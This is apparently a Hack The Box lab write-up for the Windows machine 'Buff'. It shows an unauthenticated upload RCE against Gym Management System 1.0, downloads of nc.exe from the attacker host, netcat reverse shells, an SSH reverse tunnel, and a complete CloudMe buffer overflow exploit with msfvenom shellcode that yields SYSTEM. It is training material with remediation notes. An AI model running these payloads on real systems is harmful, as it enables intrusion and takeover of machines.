+++
draft = false
date = 2020-07-24T16:04:02+01:00
title = "Buff"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 12
+++


# Machine info

- OS : Windows
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.198


# Mind Map
![Buff_MindMap](/images/htb/buff_mindmap.png)


# Reconnaisance

Initial scan:

{{< highlight html >}}
sudo nmap -sT -n -O 10.10.10.5 -oA nmap/sT_scan
{{< /highlight >}}

Result:

{{< highlight html >}}
sudo nmap -sC -sV -n -Pn 10.10.10.198

Nmap scan report for 10.10.10.198
Host is up (0.082s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

{{< /highlight >}}

# Enumeration

Only port `8080` appears to be open. Service is `http`, so let's visit the address in a web browser:

![Buff_Page8080_MindMap](/images/htb/buff_page8080.png)

We are presented with a web page about fitness packages. Looking around on the website and visiting the contact page, we can see that it was built using **Gym Management Software 1.0**.

![Gym_Management_MindMap](/images/htb/gym_management.png)

Googling for that version, we discover that there is a Remote Code Execution (RCE) vulnerability affecting this exact service:

>Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.

The exploit can be found here: https://www.exploit-db.com/exploits/48506

Once the exploit is run, we will be able to communicate with the uploaded web shell at `/upload.php?id=kamehameha` using `GET` requests with the `telepathy` parameter.

# Exploitation


I download the exploit and execute it against the target machine:

{{< highlight html >}}
python 48506.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
▒
buff\shaun

C:\xampp\htdocs\gym\upload>
{{< /highlight >}}

I  am logged in as the **shaun** user!

The obtained shell appears not to be very stable, we can upgrade it to a netcat shell. It is possible to download netcat on the target machine as follows:

- set up a python HTTP server on the attacking machine in order to serve the `nc.exe` file
- visit the following page in the web browser in order to request the file from the attacking machine:
**http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl -O 10.10.14.18:8888/nc.exe**

Where:
- `10.10.14.18` is the IP assigned to my machine

**->** After that, `nc.exe` will be present on the target machine.

To connect back to the attacking machine I set up a netcat listener on port `4444` and launch the following command from the browser:

**http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe 10.10.14.18 4444 -e cmd.exe**

Now I have a stable netcat shell:

{{< highlight html >}}
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.198] 49682
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>whoami
whoami
buff\shaun

C:\xampp\htdocs\gym\upload>
{{< /highlight >}}

# Privilege Escalation

Under `C:\Users\shaun\Downloads\` there is a program named **CloudMe_1112.exe** running as `Local System`. Searching for that program I discover that is vulnerable to buffer overflow.
The exploit is availble here: https://www.exploit-db.com/exploits/48389

It runs on port `8888`, which is unaccessible from my attacking machine, so how can I exploit that service? Setting up a **SSH Reverse Tunnel**!

**Reverse SSH tunneling allows you to use an established connection to set up a new connection from your local computer back to the remote computer.**

This means that I will be able to run the buffer overflow exploit on the attacking machine (mine) and have it executed  against the target machine!

First of all we need to download `plink.exe` on the target machine in the same way we downloaded netcat:
**http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl -O 10.10.14.18:8888/plink.exe**

Then set up the SSH Remote Tunnel from the web server:

**1.** From the attacking machine enable the ssh service:
{{< highlight html >}}
service ssh start
{{< /highlight >}}

**2.** On the web server set up the SSH Reverse Tunnel:
{{< highlight html >}}
plink.exe -l root -p toor -R 4444:127.0.0.1:8888 10.10.14.18
{{< /highlight >}}
Where:
- `-l` specifies the user on the attacking machine
- `-p` specifies the user password
- `-R` stands for remote. Everything running on the remote host `10.10.14.18` on port `4444` will be executed on the web server (`localhost`) at `8888`!

At this  point, on the local attacking machine I have to run the final exploit against the `CloudmMe` service. I only need to create a custom payload and add it to the exploit.

I want to  have a reverse connection coming back to my machine after the exploit is executed:

{{< highlight html >}}
msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.18 5555 -e cmd.exe' -b '\x00\x0A\x0D' -f python
{{< /highlight >}}
Where:
- `CMD` is the command I want to execute after the exploit, which is a netcat reverse shell on port `5555` of my machine

I paste the command result in the exploit. At this point I only have to set up a netcat listener on port `5555` and launch the exploit, which will look like:

{{< highlight html >}}
import socket
import sys

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30                                                                                                                                                     

#msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.18 5555 -e cmd.exe' -b '\x00\x0A\x0D' -f python python                                                                                                     
payload =  b""                                                                                                                                                                
payload += b"\xdb\xca\xd9\x74\x24\xf4\xb8\x84\x4f\x0f\xa5\x5b"                                                                                                                
payload += b"\x29\xc9\xb1\x3e\x83\xc3\x04\x31\x43\x15\x03\x43"
payload += b"\x15\x66\xba\xf3\x4d\xe4\x45\x0c\x8e\x88\xcc\xe9"
payload += b"\xbf\x88\xab\x7a\xef\x38\xbf\x2f\x1c\xb3\xed\xdb"
payload += b"\x97\xb1\x39\xeb\x10\x7f\x1c\xc2\xa1\xd3\x5c\x45"
payload += b"\x22\x29\xb1\xa5\x1b\xe2\xc4\xa4\x5c\x1e\x24\xf4"
payload += b"\x35\x55\x9b\xe9\x32\x23\x20\x81\x09\xa2\x20\x76"
payload += b"\xd9\xc5\x01\x29\x51\x9c\x81\xcb\xb6\x95\x8b\xd3"
payload += b"\xdb\x93\x42\x6f\x2f\x68\x55\xb9\x61\x91\xfa\x84"
payload += b"\x4d\x60\x02\xc0\x6a\x9a\x71\x38\x89\x27\x82\xff"
payload += b"\xf3\xf3\x07\xe4\x54\x70\xbf\xc0\x65\x55\x26\x82"
payload += b"\x6a\x12\x2c\xcc\x6e\xa5\xe1\x66\x8a\x2e\x04\xa9"
payload += b"\x1a\x74\x23\x6d\x46\x2f\x4a\x34\x22\x9e\x73\x26"
payload += b"\x8d\x7f\xd6\x2c\x20\x94\x6b\x6f\x2f\x6b\xf9\x15"
payload += b"\x1d\x6b\x01\x16\x32\x03\x30\x9d\xdd\x54\xcd\x74"
payload += b"\x9a\xaa\x87\xd5\x8b\x22\x4e\x8c\x89\x2f\x71\x7a"
payload += b"\xcd\x49\xf2\x8f\xae\xae\xea\xe5\xab\xeb\xac\x16"
payload += b"\xc6\x64\x59\x19\x75\x85\x48\x5a\x43\x25\x0b\x3c"
payload += b"\xde\xa5\x9b\xe2\x48\x31\x38\x74\xea\xca\x9c\xed"
payload += b"\x95\x41\x41\x87\x15\xf5\x16\x06\xb2\x59\x87\xab"
payload += b"\x14\x04\x2f\x49\x49\xeb\xaa\xb1\xea\x9e\x50\x9c"
payload += b"\x89\x18\xfc\xc0\x60\xe8\xd0\x31\xb3\x26\x1c\x06"
payload += b"\x9d\x07\x66\x46\xd4\x52\xa3\xb3\x16"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,4444))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)
{{< /highlight >}}

**Note**: The exploit will be run against port `4444` on the local machine (attacking machine) but it will be forwarded to the web server on port `8888` leveraging the ssh tunnel.

Launching the exploit locally will result in a **SYSTEM** shell!
{{< highlight html >}}
nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.198] 49688
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator

C:\Windows\system32>
{{< /highlight >}}

## Lessons learned and remediations

- The website is built on on a technology that presents security vulnerabilities. It was easy to find an exploit and gain a low privileged session on the web server. The administrator should patch the software if an update is available or he should consider to switch to another service that is more secure.
- The administrator should consider removing the CloudMe application (vulnerable to BoF and running as Local System) from a system space dedicated to low privileged users. The program can be easily exploited to gain System privileges on the machine.  
